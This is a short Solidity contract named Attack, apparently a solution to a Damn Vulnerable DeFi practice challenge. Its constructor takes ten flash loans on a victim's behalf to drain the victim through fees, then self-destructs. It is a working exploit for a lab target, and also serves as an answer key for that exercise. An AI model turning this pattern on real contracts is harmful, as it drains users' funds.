// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

/**
 * @title Attack
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract Attack {
    constructor(address pool, address victim) {
        ILenderPool(pool).flashLoan(victim, 1);
        ILenderPool(pool).flashLoan(victim, 1);
        ILenderPool(pool).flashLoan(victim, 1);
        ILenderPool(pool).flashLoan(victim, 1);
        ILenderPool(pool).flashLoan(victim, 1);
        ILenderPool(pool).flashLoan(victim, 1);
        ILenderPool(pool).flashLoan(victim, 1);
        ILenderPool(pool).flashLoan(victim, 1);
        ILenderPool(pool).flashLoan(victim, 1);
        ILenderPool(pool).flashLoan(victim, 1);
        selfdestruct(payable(msg.sender));
    }
}

interface ILenderPool {
    function flashLoan(address borrower, uint256 borrowAmount) external;
}
